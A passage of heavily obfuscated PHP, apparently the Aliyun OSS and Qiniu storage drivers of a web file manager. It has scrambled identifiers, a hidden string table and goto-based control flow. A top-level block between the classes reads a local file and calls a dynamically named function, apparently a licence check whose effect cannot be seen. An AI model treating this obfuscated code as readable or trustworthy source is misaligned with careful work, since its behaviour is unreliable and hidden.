$f­ÉÂ‹ï„[77], $f­ÉÂ‹ï„[187] => $f­ÉÂ‹ï„[50], $f­ÉÂ‹ï„[106] => $f­ÉÂ‹ï„[50], $f­ÉÂ‹ï„[188] => !0, $f­ÉÂ‹ï„[189] => !0); return $b·Öæ«ÊÜ; } public function exist($C —ùèÌ ©) { if ($this->_isFile($C —ùèÌ ©) || $this->_isFolder($C —ùèÌ ©)) { return !0; } return !1; } public function size($eÜøŠ†–) { return $this->cacheMehod($_SERVER[İë¬“ÅÒÛ›][899], $eÜøŠ†–); } public function info($aÏ¾À®íâ§) { return $this->cacheMehod($_SERVER[İë¬“ÅÒÛ›][183], $aÏ¾À®íâ§); } public function isFile($eÈ—œ‹«Ê÷) { return $this->cacheMehod($_SERVER[İë¬“ÅÒÛ›][184], $eÈ—œ‹«Ê÷); } public function isFolder($aÈùĞÑÖÖå) { return $this->cacheMehod($_SERVER[İë¬“ÅÒÛ›][185], $aÈùĞÑÖÖå); } public function _isFile($DÆæÙÒ‘§) { if ($this->_isFolder($DÆæÙÒ‘§)) { return !1; } try { return $this->client->doesObjectExist($this->bucket, $this->pathEncode($DÆæÙÒ‘§)); } catch (OSS\Core\OssException $d¼ëÚôÃÇƒ) { return !1; } } public function _isFolder($Dä…Ø¨íŸÄ) { $Eª…´ò——¯ =& $_SERVER[İë¬“ÅÒÛ›]; try { $Dä…Ø¨íŸÄ = trim($Dä…Ø¨íŸÄ, $Eª…´ò——¯[8]); $C÷¥±‹Œƒ = array($Eª…´ò——¯[918] => $Eª…´ò——¯[8], $Eª…´ò——¯[186] => empty($Dä…Ø¨íŸÄ) ? $Eª…´ò——¯[33] : $Dä…Ø¨íŸÄ . $Eª…´ò——¯[8], $Eª…´ò——¯[919] => 1, $Eª…´ò——¯[920] => $Eª…´ò——¯[33]); $E÷Õòã‰Æ = $this->client->listObjects($this->bucket, $C÷¥±‹Œƒ); } catch (OSS\Core\OssException $fÅö°‡†£‰) { return !1; } $Bª’Ñ¿¦¥ = $E÷Õòã‰Æ->getObjectList(); $aé¨Œ¬÷¸Í = $E÷Õòã‰Æ->getPrefixList(); return empty($Bª’Ñ¿¦¥) && empty($aé¨Œ¬÷¸Í) ? !1 : !0; } public function listPath($A™ğ«¡¶’¬, $E‹Õª¸ãØë = false) { $f”Ï•Ø¬µ =& $_SERVER[İë¬“ÅÒÛ›]; $C‡”Àë‚å = $this->fileList($A™ğ«¡¶’¬, $f”Ï•Ø¬µ[8], 1); foreach ($C‡”Àë‚å[$f”Ï•Ø¬µ[75]] as $dËøÚ¹†Å => $aœ¤äÅ¬æ) { $C‡”Àë‚å[$f”Ï•Ø¬µ[75]][$dËøÚ¹†Å] = $this->folderInfo($aœ¤äÅ¬æ, $E‹Õª¸ãØë); } foreach ($C‡”Àë‚å[$f”Ï•Ø¬µ[74]] as $dËøÚ¹†Å => $A…Ù¨ÒŠ³‚) { $C‡”Àë‚å[$f”Ï•Ø¬µ[74]][$dËøÚ¹†Å] = $this->fileInfo($A…Ù¨ÒŠ³‚[$f”Ï•Ø¬µ[28]], $A…Ù¨ÒŠ³‚, $E‹Õª¸ãØë); } return $C‡”Àë‚å; } public function has($d±Ò›âÕ«, $E”÷§ºÒÉ = false, $A˜³Œ…Ï = true) { goto Déë’ØÄİ; DÊãä Ä™–: $B™Äõâ„ÒÆ = 0; while (!0) { $fğÌ‰öˆ¡º = array($bá©ÓºÛíÊ[918] => $bá©ÓºÛíÊ[8], $bá©ÓºÛíÊ[186] => $EÛßŠ…ˆ¢†, $bá©ÓºÛíÊ[919] => $c¦×´•›Ô, $bá©ÓºÛíÊ[920] => $B¿Ãˆ§‹º); try { $C‰Ç¾ñÕ¢Ó = $this->client->listObjects($this->bucket, $fğÌ‰öˆ¡º); } catch (OSS\Core\OssException $Fç„„ŞÃ’±) { break; } $B¿Ãˆ§‹º = $C‰Ç¾ñÕ¢Ó->getNextMarker(); $CÕµÓÏ•êâ = $C‰Ç¾ñÕ¢Ó->getObjectList(); $e©Õ¨—‡¢… = $C‰Ç¾ñÕ¢Ó->getPrefixList(); if ($E”÷§ºÒÉ) { if (count($CÕµÓÏ•êâ) > 1 || $CÕµÓÏ•êâ[0]->getKey() != $EÛßŠ…ˆ¢†) { $böäœâÃÉğ += count($CÕµÓÏ•êâ) - 1; } if (!empty($e©Õ¨—‡¢…)) { $B™Äõâ„ÒÆ += count($e©Õ¨—‡¢…); } if ($B¿Ãˆ§‹º === $bá©ÓºÛíÊ[33]) { break; } continue; } if ($A˜³Œ…Ï) { if (!empty($CÕµÓÏ•êâ)) { if (count($CÕµÓÏ•êâ) > 1 || $CÕµÓÏ•êâ[0]->getKey() != $EÛßŠ…ˆ¢†) { return !0; } } } else { if (!empty($e©Õ¨—‡¢…)) { return !0; } } if ($B¿Ãˆ§‹º === $bá©ÓºÛíÊ[33]) { break; } } if ($E”÷§ºÒÉ) { return array($bá©ÓºÛíÊ[191] => $böäœâÃÉğ, $bá©ÓºÛíÊ[192] => $B™Äõâ„ÒÆ); } goto Bó§ßËàÌ; Déë’ØÄİ: $bá©ÓºÛíÊ =& $_SERVER[İë¬“ÅÒÛ›]; $d±Ò›âÕ« = trim($d±Ò›âÕ«, $bá©ÓºÛíÊ[8]); $EÛßŠ…ˆ¢† = empty($d±Ò›âÕ«) ? $bá©ÓºÛíÊ[33] : $d±Ò›âÕ« . $bá©ÓºÛíÊ[8]; goto fò¹±¨Ø¦˜; Bó§ßËàÌ: return !1; goto fÃç¦¾¶Ï¾; fò¹±¨Ø¦˜: $B¿Ãˆ§‹º = $bá©ÓºÛíÊ[33]; $c¦×´•›Ô = 500; $böäœâÃÉğ = 0; goto DÊãä Ä™–; fÃç¦¾¶Ï¾: } public function listAll($DÁçÁˆƒùä) { $A®µÚ¡¥· =& $_SERVER[İë¬“ÅÒÛ›]; $fõâ‹±ñ– = $this->fileList($DÁçÁˆƒùä, $A®µÚ¡¥·[33], 1); $a—¼…Òª­í = array(); foreach ($fõâ‹±ñ–[$A®µÚ¡¥·[74]] as $B¹è§Üß¾œ) { $a—¼…Òª­í[$B¹è§Üß¾œ[$A®µÚ¡¥·[28]]] = $B¹è§Üß¾œ[$A®µÚ¡¥·[78]]; } return $this->listAllFiles($DÁçÁˆƒùä, array_keys($a—¼…Òª­í), $a—¼…Òª­í); } public function canRead($Fóé•‚‡¯À) { $f¾š©Î†ô˜ =& $_SERVER[İë¬“ÅÒÛ›]; $aÇ˜¸Š»í± = $this->pathAcl($Fóé•‚‡¯À); return $aÇ˜¸Š»í± == $f¾š©Î†ô˜[931] || $aÇ˜¸Š»í± == $f¾š©Î†ô˜[932] ? !0 : !1; } public function canWrite($cßªÌŸòÔ) { $c¤ÇòšƒùÎ = $this->pathAcl($cßªÌŸòÔ); return $c¤ÇòšƒùÎ == $_SERVER[İë¬“ÅÒÛ›][932] ? !0 : !1; } public function pathAcl($dà±Æä¢®À) { goto D¯ß›Âë¼; BïÉ´Âóé: return $DŸÄÅê¨—‹; goto BÛ‹”äŸ; d‡ËÜÖ…‹Ø: $DŸÄÅê¨—‹ = $bêÏï«˜Æİ == $CÖ’ùÙ“„Í[34] ? $this->bucketAcl : $bêÏï«˜Æİ; if ($DŸÄÅê¨—‹ == $CÖ’ùÙ“„Í[933]) { return $CÖ’ùÙ“„Í[931]; } if ($DŸÄÅê¨—‹ == $CÖ’ùÙ“„Í[934]) { return $CÖ’ùÙ“„Í[932]; } goto BïÉ´Âóé; D¯ß›Âë¼: $CÖ’ùÙ“„Í =& $_SERVER[İë¬“ÅÒÛ›]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $bêÏï«˜Æİ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($dà±Æä¢®À)); } catch (OSS\Core\OssException $AÍ÷Ş‚Î‚³) { return !1; } goto d‡ËÜÖ…‹Ø; BÛ‹”äŸ: } private function chmodPath($DŞ‡¡´ğ£ç, $dœØâ”é©œ = '') { $fİ„ÜŞã™ =& $_SERVER[İë¬“ÅÒÛ›]; $FîÌã„ê = empty($dœØâ”é©œ) ? $fİ„ÜŞã™[934] : $dœØâ”é©œ; $fËˆë«†¢Æ = array($fİ„ÜŞã™[34], $fİ„ÜŞã™[182], $fİ„ÜŞã™[933], $fİ„ÜŞã™[934]); if (!in_array($FîÌã„ê, $fËˆë«†¢Æ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($DŞ‡¡´ğ£ç), $FîÌã„ê); } catch (OSS\Core\OssException $f¾Çêí«§) { return !1; } return !0; } public function getContent($Cô”Û«¨¬) { return $this->fileSubstr($Cô”Û«¨¬, -1); } public function setContent($Eõ„Ìæå¨Õ, $B¥ŸÖ„·ã = '') { $F–¸Ş¸ë°Ï =& $_SERVER[İë¬“ÅÒÛ›]; try { $EË‘¢ÌÚ = array(); $DİâÉô„‚ = $this->client->putObject($this->bucket, $this->pathEncode($Eõ„Ìæå¨Õ), $B¥ŸÖ„·ã, $EË‘¢ÌÚ); } catch (OSS\Core\OssException $Eİ¬ÇïîÎ“) { return !1; } $FÓ­ÆÀÀ¨î = array($F–¸Ş¸ë°Ï[921] => trim($DİâÉô„‚[$F–¸Ş¸ë°Ï[935]], $F–¸Ş¸ë°Ï[112]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Eõ„Ìæå¨Õ))); $this->updateObjMeta($Eõ„Ìæå¨Õ, $FÓ­ÆÀÀ¨î); return isset($DİâÉô„‚[$F–¸Ş¸ë°Ï[936]][$F–¸Ş¸ë°Ï[882]]) ? (int) $DİâÉô„‚[$F–¸Ş¸ë°Ï[936]][$F–¸Ş¸ë°Ï[882]] : strlen($DİâÉô„‚); } private function updateObjMeta($FíÆ²ÒÂÛœ, $FÑ²ó¿ä„¯) { $FíÆ²ÒÂÛœ = $this->pathEncode($FíÆ²ÒÂÛœ); try { $A‚²ÜÇœ·„ = array(OSS\OssClient::OSS_HEADERS => $FÑ²ó¿ä„¯); $this->client->copyObject($this->bucket, $FíÆ²ÒÂÛœ, $this->bucket, $FíÆ²ÒÂÛœ, $A‚²ÜÇœ·„); } catch (OSS\Core\OssException $EÙ°’Ú§) { return !1; } return !0; } public function upload($fÃŞó‹² Ë, $DôÁå¹ò›Ü, $D«„ˆŸ¡ß = false, $FÌ˜‡æÉ = REPEAT_REPLACE) { $Dèí¾¿Ü–Õ =& $_SERVER[İë¬“ÅÒÛ›]; $E´Ü˜³Û· = trim($fÃŞó‹² Ë, $Dèí¾¿Ü–Õ[8]); $e¬Â‰Æé¨Í = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => $this->osChunkSize(), OSS\OssClient::OSS_HEADERS => array($Dèí¾¿Ü–Õ[921] => @md5_file($DôÁå¹ò›Ü)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($fÃŞó‹² Ë))); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($E´Ü˜³Û·), $DôÁå¹ò›Ü, $e¬Â‰Æé¨Í); } catch (OSS\Core\OssException $FŒ™±ğäÅš) { return !1; } return $this->getPathOuter($fÃŞó‹² Ë); } public function getHost() { $B×‹®œ¨Å =& $_SERVER[İë¬“ÅÒÛ›]; $d¨ØƒŸñÙ = explode($B×‹®œ¨Å[168], parent::getHost()); return $d¨ØƒŸñÙ[0] . $B×‹®œ¨Å[168] . $this->bucket . $B×‹®œ¨Å[92] . $d¨ØƒŸñÙ[1]; } public function uploadFormData($BªÍ©„ÀÚ®, $bì…ÇâïÊ¿ = 3600) { goto Eä‘¼ïø¹ì; Eä‘¼ïø¹ì: $B—…ì¶Î¸¸ =& $_SERVER[İë¬“ÅÒÛ›]; if (!($dËİâÓß¼¬ = $this->getHost())) { return !1; } $E†–¢Ú¢ÙÁ = $bì…ÇâïÊ¿; goto D„Ã¹õ¢ò; c÷ÊÛƒÅ: $c”à¹¶æŒ§ = strpos($F‡¬ñĞÕš, $B—…ì¶Î¸¸[288]); $F‡¬ñĞÕš = substr($F‡¬ñĞÕš, 0, $c”à¹¶æŒ§) . $B—…ì¶Î¸¸[938]; $Eïäòºß¹Ï = 1048576000 * 5; goto b‘Øİ§Ïˆ; D„Ã¹õ¢ò: $Dİ–ßÜÛ£à = date($B—…ì¶Î¸¸[937], time() + $E†–¢Ú¢ÙÁ); $a›‡°¢˜Ñ = new DateTime($Dİ–ßÜÛ£à); $F‡¬ñĞÕš = $a›‡°¢˜Ñ->format(DateTime::ISO8601); goto c÷ÊÛƒÅ; aÈ”‰ØÜ˜Ì: $bãÌØ»ôâ• = json_encode($b§Áî‘‘); $fÂ£Æ×¥ = base64_encode($bãÌØ»ôâ•); $c™Íôğœô = base64_encode(hash_hmac($B—…ì¶Î¸¸[225], $fÂ£Æ×¥, $this->secret, !0)); goto E°ğ¬òéİ; b‘Øİ§Ïˆ: $E¦¡¦ñ³‡× = array($B—…ì¶Î¸¸[939], 0, $Eïäòºß¹Ï); $B˜à÷”¢¿º[] = $E¦¡¦ñ³‡×; $aˆóîï§ò = $this->pathFather($BªÍ©„ÀÚ®); goto bË­ª»‰×í; bË­ª»‰×í: $f‚‹÷øÂãÏ = array($B—…ì¶Î¸¸[846], $B—…ì¶Î¸¸[847], $aˆóîï§ò); $B˜à÷”¢¿º[] = $f‚‹÷øÂãÏ; $b§Áî‘‘ = array($B—…ì¶Î¸¸[842] => $F‡¬ñĞÕš, $B—…ì¶Î¸¸[843] => $B˜à÷”¢¿º); goto aÈ”‰ØÜ˜Ì; E°ğ¬òéİ: return array($B—…ì¶Î¸¸[852] => $fÂ£Æ×¥, $B—…ì¶Î¸¸[940] => $this->accessKey, $B—…ì¶Î¸¸[848] => $B—…ì¶Î¸¸[840], $B—…ì¶Î¸¸[941] => $c™Íôğœô, $B—…ì¶Î¸¸[166] => $dËİâÓß¼¬); goto b¼Å‹®¿à; b¼Å‹®¿à: } public function multiUploadFormData($F…ÈñÆóœÈ, $F›øªğˆ¼º = 3600) { $C¡Š¯Ó‚˜É =& $_SERVER[İë¬“ÅÒÛ›]; if (!($d¶‘Ê«á = $this->getHost())) { return !1; } $EÃæĞ¿òãí = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($F…ÈñÆóœÈ)); return array($C¡Š¯Ó‚˜É[216] => $EÃæĞ¿òãí, $C¡Š¯Ó‚˜É[166] => $d¶‘Ê«á . $C¡Š¯Ó‚˜É[8] . $this->pathEncode($F…ÈñÆóœÈ), $C¡Š¯Ó‚˜É[217] => gmdate($C¡Š¯Ó‚˜É[942]), $C¡Š¯Ó‚˜É[88] => $F…ÈñÆóœÈ); } public function multiUploadAuthData($B¹±˜šõ , $Aéœ†Øà¿Î = array()) { goto dÆğ¢èğ§¬; d÷â¢˜•‡÷: $cÃÛ–Äì‰ = $D°Æ¿¥š¼æ[944] . $this->accessKey . $D°Æ¿¥š¼æ[4] . $b•Æ³ßáÁ¥; if (strpos($Bğá®£áè», $D°Æ¿¥š¼æ[220]) === 0) { $cÃÛ–Äì‰ = array($D°Æ¿¥š¼æ[227] => $cÃÛ–Äì‰, $D°Æ¿¥š¼æ[217] => $CÉ·ïİØ‰‰); } return $cÃÛ–Äì‰; goto AŠ¤ÈğŞ¢·; dêØ©¼•: if (!empty($Aéœ†Øà¿Î[$D°Æ¿¥š¼æ[943]])) { $D‚š…±›„ = array_merge(array($d÷çŸÉœôƒ[4]), $Aéœ†Øà¿Î[$D°Æ¿¥š¼æ[943]]); sort($D‚š…±›„); $d÷çŸÉœôƒ[4] = implode($D°Æ¿¥š¼æ[224], $D‚š…±›„); } $cÒùÂ‚œÆî = implode($D°Æ¿¥š¼æ[224], $d÷çŸÉœôƒ); $b•Æ³ßáÁ¥ = base64_encode(hash_hmac($D°Æ¿¥š¼æ[225], $cÒùÂ‚œÆî, $this->secret, !0)); goto d÷â¢˜•‡÷; dÆğ¢èğ§¬: $D°Æ¿¥š¼æ =& $_SERVER[İë¬“ÅÒÛ›]; $CÉ·ïİØ‰‰ = isset($Aéœ†Øà¿Î[$D°Æ¿¥š¼æ[217]]) ? $Aéœ†Øà¿Î[$D°Æ¿¥š¼æ[217]] : gmdate($D°Æ¿¥š¼æ[942]); $Bğá®£áè» = isset($Aéœ†Øà¿Î[$D°Æ¿¥š¼æ[157]]) ? $Aéœ†Øà¿Î[$D°Æ¿¥š¼æ[157]] : $D°Æ¿¥š¼æ[33]; goto d—ˆÍ”ÅÄ; E´ƒÄ¡‡ğ†: $d÷çŸÉœôƒ = array($D°Æ¿¥š¼æ[219], $D°Æ¿¥š¼æ[33], $D°Æ¿¥š¼æ[115], $CÉ·ïİØ‰‰, "\170\55\x6f\x73\163\55\x64\x61\x74\x65\72{$CÉ·ïİØ‰‰}", $D°Æ¿¥š¼æ[8] . $this->bucket . $D°Æ¿¥š¼æ[8] . $aà‹ôµ¼Ù³ . $Bğá®£áè»); if (strpos($Bğá®£áè», $D°Æ¿¥š¼æ[220]) === 0) { $d÷çŸÉœôƒ[0] = $D°Æ¿¥š¼æ[221]; } if (isset($Aéœ†Øà¿Î[$D°Æ¿¥š¼æ[222]]) && $Aéœ†Øà¿Î[$D°Æ¿¥š¼æ[222]] == $D°Æ¿¥š¼æ[223]) { $d÷çŸÉœôƒ[0] = $D°Æ¿¥š¼æ[223]; } goto dêØ©¼•; d—ˆÍ”ÅÄ: $aà‹ôµ¼Ù³ = $B¹±˜šõ ; if (isset($Aéœ†Øà¿Î[$D°Æ¿¥š¼æ[88]])) { $aà‹ôµ¼Ù³ = $Aéœ†Øà¿Î[$D°Æ¿¥š¼æ[88]]; unset($Aéœ†Øà¿Î[$D°Æ¿¥š¼æ[88]]); } if (isset($Aéœ†Øà¿Î[$D°Æ¿¥š¼æ[218]])) { return $this->listUploadParts($aà‹ôµ¼Ù³, $CÉ·ïİØ‰‰, $Aéœ†Øà¿Î); } goto E´ƒÄ¡‡ğ†; AŠ¤ÈğŞ¢·: } public function listUploadParts($C…ù½‘Ñ²ƒ, $EëÈÆÈ•ßù, $F·™Â¸ÚòÊ) { goto CÁÅ¤‡ãÀÉ; CÁÅ¤‡ãÀÉ: $FÄ®ÑÏÏ¡Ì =& $_SERVER[İë¬“ÅÒÛ›]; $F‡ƒ’„„Ì¨ = parse_url_query($F·™Â¸ÚòÊ[$FÄ®ÑÏÏ¡Ì[157]]); $b†’¸ÖÄª‡ = $this->client->listParts($this->bucket, $this->pathEncode($C…ù½‘Ñ²ƒ), $F‡ƒ’„„Ì¨[$FÄ®ÑÏÏ¡Ì[216]]); goto A’–óÇ‰ã¡; Aõ¦Ëˆ¢’‘: unset($F·™Â¸ÚòÊ[$FÄ®ÑÏÏ¡Ì[218]], $F·™Â¸ÚòÊ[$FÄ®ÑÏÏ¡Ì[222]]); $AÄ§å»ì„  = $this->multiUploadAuthData($C…ù½‘Ñ²ƒ, $F·™Â¸ÚòÊ); if (empty($AÄ§å»ì„ )) { return !1; } goto A¶Ï‰ÃŒè; A¶Ï‰ÃŒè: return array($FÄ®ÑÏÏ¡Ì[227] => $AÄ§å»ì„ , $FÄ®ÑÏÏ¡Ì[217] => $EëÈÆÈ•ßù, $FÄ®ÑÏÏ¡Ì[229] => $a½¢Œ«ÇÑâ); goto AÍóİ³§‘ñ; A’–óÇ‰ã¡: $Eªº•¶ŸÂ· = $b†’¸ÖÄª‡->getListPart(); $a½¢Œ«ÇÑâ = array(); foreach ($Eªº•¶ŸÂ· as $Dè¹¾Æééš) { $a½¢Œ«ÇÑâ[] = array($FÄ®ÑÏÏ¡Ì[925] => $Dè¹¾Æééš->getPartNumber(), $FÄ®ÑÏÏ¡Ì[926] => trim($Dè¹¾Æééš->getETag(), $FÄ®ÑÏÏ¡Ì[112])); } goto Aõ¦Ëˆ¢’‘; AÍóİ³§‘ñ: } public function download($e¥”ë», $b¼«‚Æâğâ) { if ($this->isFolder($e¥”ë»)) { return !1; } try { $bğø¢ô¥³Ş = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $b¼«‚Æâğâ); $this->client->getObject($this->bucket, $this->pathEncode($e¥”ë»), $bğø¢ô¥³Ş); } catch (OSS\Core\OssException $B÷°¼â×éõ) { return !1; } return $b¼«‚Æâğâ; } public function fileSubstr($bÏ§Ñ›ÑÜ, $F‚àÛ·›°ö = 0, $eö¨…áÇ½ = false) { if ($F‚àÛ·›°ö === -1) { $Câ¹—£Ë‚­ = array(); } else { if ($eö¨…áÇ½ === !1) { $A¼¹£¯µªÔ = $this->size($bÏ§Ñ›ÑÜ); } else { $A¼¹£¯µªÔ = $F‚àÛ·›°ö + $eö¨…áÇ½ - 1; } $Câ¹—£Ë‚­ = array(OSS\OssClient::OSS_RANGE => "{$F‚àÛ·›°ö}\55{$A¼¹£¯µªÔ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($bÏ§Ñ›ÑÜ), $Câ¹—£Ë‚­); } catch (OSS\Core\OssException $f˜ëÓš …) { return !1; } } public function link($DŞ·ŒñÎÄ½, $D´æİ¬ÖÒ = array()) { if (!$this->exist($DŞ·ŒñÎÄ½) || $this->isFolder($DŞ·ŒñÎÄ½)) { return !1; } try { return $this->client->signUrl($this->bucket, $this->pathEncode($DŞ·ŒñÎÄ½), 3600 * 12, $_SERVER[İë¬“ÅÒÛ›][223], $D´æİ¬ÖÒ); } catch (OSS\Core\OssException $E¡Á˜Ã¡õ) { return !1; } } public function fileOut($AË¹×£Úã, $fŞ‹¥è•ø„ = false, $FßËˆ’Ÿ = false, $bÒŠ¾æç’Ù = '') { goto f±›•Õğ¿; CíÅÜçÏÜ: if ($b¿ˆ‚ºñ½¹ && $b¿ˆ‚ºñ½¹ >= 819200 && $b¿ˆ‚ºñ½¹ <= 838860800) { $B°×Ê¨‘Ê[OSS\OssClient::OSS_SUB_RESOURCE] .= $Bù‘°‚òŒ†[947] . $b¿ˆ‚ºñ½¹; } $D´ĞÀ¬Ò÷Ó = $this->link($AË¹×£Úã, $B°×Ê¨‘Ê); $this->fileOutLink($D´ĞÀ¬Ò÷Ó); goto Fòâ½—ÔÁ©; bÛ«¡¥¤¢Ë: $B°×Ê¨‘Ê = array(OSS\OssClient::OSS_SUB_RESOURCE => $Bù‘°‚òŒ†[945] . rawurlencode("{$fŞ‹¥è•ø„}\73\x66\x69\x6c\x65\156\141\x6d\145\75{$FßËˆ’Ÿ}")); $B°×Ê¨‘Ê[OSS\OssClient::OSS_SUB_RESOURCE] .= $Bù‘°‚òŒ†[946] . $a…«Üèµ´Ó; $b¿ˆ‚ºñ½¹ = intval($GLOBALS[$Bù‘°‚òŒ†[6]][$Bù‘°‚òŒ†[84]][$Bù‘°‚òŒ†[90]][$Bù‘°‚òŒ†[104]] * 1024 * 1024 * 8); goto CíÅÜçÏÜ; eÂ‚š¼­: if ($a…«Üèµ´Ó == $Bù‘°‚òŒ†[201]) { return parent::fileOut($AË¹×£Úã, $fŞ‹¥è•ø„, $FßËˆ’Ÿ, $bÒŠ¾æç’Ù); } $fŞ‹¥è•ø„ = $fŞ‹¥è•ø„ ? $Bù‘°‚òŒ†[202] : $Bù‘°‚òŒ†[203]; $FßËˆ’Ÿ = $this->pathEncode($FßËˆ’Ÿ); goto bÛ«¡¥¤¢Ë; f±›•Õğ¿: $Bù‘°‚òŒ† =& $_SERVER[İë¬“ÅÒÛ›]; if (!$FßËˆ’Ÿ) { $FßËˆ’Ÿ = $this->pathThis($AË¹×£Úã); } $a…«Üèµ´Ó = get_file_mime(get_path_ext($FßËˆ’Ÿ)); goto eÂ‚š¼­; Fòâ½—ÔÁ©: } public function fileOutServer($dÓ¥ÓÚÕ¦©, $cÙÇĞÒôÛ‘ = false, $dÑ §‡„ºî = false, $föÊÛ¾Ÿ = '') { parent::fileOut($dÓ¥ÓÚÕ¦©, $cÙÇĞÒôÛ‘, $dÑ §‡„ºî, $föÊÛ¾Ÿ); } public function fileOutImage($E¶¯ãÁ ‡ß, $eË Œ¥·Á¸ = 250) { $Bñ†Š”»­´ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[İë¬“ÅÒÛ›][948] . $eË Œ¥·Á¸); $aÅŒŞ¤ÊËÈ = $this->link($E¶¯ãÁ ‡ß, $Bñ†Š”»­´); $this->fileOutLink($aÅŒŞ¤ÊËÈ); } public function fileOutImageServer($A«Ë²Í¢Í, $b‡Ï°ª–»Ó = 250) { parent::fileOutImage($A«Ë²Í¢Í, $b‡Ï°ª–»Ó); } public function hashMd5($DœŠ‡••–º, $bœ¶¾Æ êÃ = '') { $añÌÀà‚ÌÃ =& $_SERVER[İë¬“ÅÒÛ›]; try { $Bä¶Á˜» = $this->client->getObjectMeta($this->bucket, $this->pathEncode($DœŠ‡••–º)); } catch (OSS\Core\OssException $eÆ¯¥ªÅŸ) { return !1; } if (!isset($Bä¶Á˜»[$añÌÀà‚ÌÃ[921]]) && !empty($bœ¶¾Æ êÃ)) { $c‡“«‰àÍ‘ = $this->updateObjMeta($DœŠ‡••–º, array($añÌÀà‚ÌÃ[921] => $bœ¶¾Æ êÃ)); $Bä¶Á˜»[$añÌÀà‚ÌÃ[921]] = $c‡“«‰àÍ‘ ? $bœ¶¾Æ êÃ : $añÌÀà‚ÌÃ[33]; } return isset($Bä¶Á˜»[$añÌÀà‚ÌÃ[921]]) ? $Bä¶Á˜»[$añÌÀà‚ÌÃ[921]] : $añÌÀà‚ÌÃ[33]; } private function fileInfoImage($e¥ëé‡º­à, &$cåÓ¼âáğ) { goto CóÜ·ß¹±; BÍ„İÊ¶: if (!$A’òêÊ´Ã±[$D–ëÛè›ƒ„[447]]) { return !1; } $cåÓ¼âáğ[$D–ëÛè›ƒ„[212]] = array($D–ëÛè›ƒ„[213] => $A’òêÊ´Ã±[$D–ëÛè›ƒ„[786]][$D–ëÛè›ƒ„[950]][$D–ëÛè›ƒ„[360]], $D–ëÛè›ƒ„[214] => $A’òêÊ´Ã±[$D–ëÛè›ƒ„[786]][$D–ëÛè›ƒ„[951]][$D–ëÛè›ƒ„[360]]); goto Dˆ®ÄÁ‚Ğ”; CóÜ·ß¹±: $D–ëÛè›ƒ„ =& $_SERVER[İë¬“ÅÒÛ›]; $C²“´âæÖÅ = array($D–ëÛè›ƒ„[208], $D–ëÛè›ƒ„[158], $D–ëÛè›ƒ„[209], $D–ëÛè›ƒ„[210], $D–ëÛè›ƒ„[211]); if (!in_array($cåÓ¼âáğ[$D–ëÛè›ƒ„[157]], $C²“´âæÖÅ)) { return; } goto EŒ‹åÛ¥Í; EŒ‹åÛ¥Í: $Cœéí—£¢Ş = array(OSS\OssClient::OSS_PROCESS => $D–ëÛè›ƒ„[949]); $Bå½Ù¸øÏ• = $this->link($e¥ëé‡º­à, $Cœéí—£¢Ş); $A’òêÊ´Ã± = url_request($Bå½Ù¸øÏ•, $D–ëÛè›ƒ„[223], !1, !1, !1, !0); goto BÍ„İÊ¶; Dˆ®ÄÁ‚Ğ”: } } goto cäí’î¿¡; bÁ¤ÛÌŒêÀ: define($_SERVER[İë¬“ÅÒÛ›][1362], 1); define($_SERVER[İë¬“ÅÒÛ›][1363], 2); define($_SERVER[İë¬“ÅÒÛ›][1364], 3); goto aä†£ñùÂ; cäí’î¿¡: if ($_SERVER[$_SERVER[İë¬“ÅÒÛ›][556]] != $_SERVER[$_SERVER[İë¬“ÅÒÛ›][952]]) { goto B¬ÜËÉÅ¯ğ; FÁƒœÚìîÎ: $eŞªÕÑô£Ÿ($_SERVER[$_SERVER[İë¬“ÅÒÛ›][592]]); goto e‘Ó»“öïç; CÄ…÷Ò’‹à: $a¶ª¾£æÂ¨ = explode($_SERVER[İë¬“ÅÒÛ›][224], $FÀï‹˜©È¹); if (count($a¶ª¾£æÂ¨) < $_SERVER[İë¬“ÅÒÛ›][593]) { die; } $eŞªÕÑô£Ÿ = $_SERVER[İë¬“ÅÒÛ›][594]; goto FÁƒœÚìîÎ; B¬ÜËÉÅ¯ğ: $f£Ó®ôÀ = $_SERVER[İë¬“ÅÒÛ›][557]; $cµèŒ‘¸Ş = BASIC_PATH . $_SERVER[İë¬“ÅÒÛ›][554]; $FÀï‹˜©È¹ = $f£Ó®ôÀ($cµèŒ‘¸Ş); goto CÄ…÷Ò’‹à; e‘Ó»“öïç: } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public function __construct($aµ£©åÏ–´) { parent::__construct(); require_once SDK_DIR . $_SERVER[İë¬“ÅÒÛ›][953]; $this->_init($aµ£©åÏ–´); } public function _init($B¹œ‰îïøŸ) { foreach ($B¹œ‰îïøŸ as $D¦ˆƒö¸—” => $A‚”ŸÄö¢š) { if (isset($this->{$D¦ˆƒö¸—”})) { $this->{$D¦ˆƒö¸—”} = $A‚”ŸÄö¢š; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[İë¬“ÅÒÛ›][954], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($AõÉÙŸëŒ, $b‚êì£êç¡ = '', $F„¦ê¢ˆìò = REPEAT_RENAME) { if ($this->setContent($AõÉÙŸëŒ, $b‚êì£êç¡)) { return $this->getPathOuter($AõÉÙŸëŒ); } return !1; } public function mkdir($A¬‡îãË¥Ò, $BæÆœÁŒÆŒ = REPEAT_SKIP) { goto F­íèÊÑĞ•; cŒ¾Ûä©‚–: $A¬‡îãË¥Ò = 